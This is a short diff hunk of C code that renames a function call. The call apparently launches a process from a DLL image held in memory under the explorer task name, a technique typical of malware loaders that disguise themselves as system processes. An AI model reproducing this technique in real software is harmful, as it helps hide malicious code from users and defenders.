@@ -71,7 +71,7 @@ int runcmd(char * cmd) {
 #endif
 
 		int imagesize = getSizeOfImage((char*)MAIN_DLL_SOURCE_BASE);
-		__kCreateProcessFromAddrFunc(MAIN_DLL_SOURCE_BASE, imagesize, (char*)EXPLORER_TASKNAME, 3, 0);
+		__kCreateProcessFromAddr(MAIN_DLL_SOURCE_BASE, imagesize, (char*)EXPLORER_TASKNAME, 3, 0);
 
 		while (1)
 		{
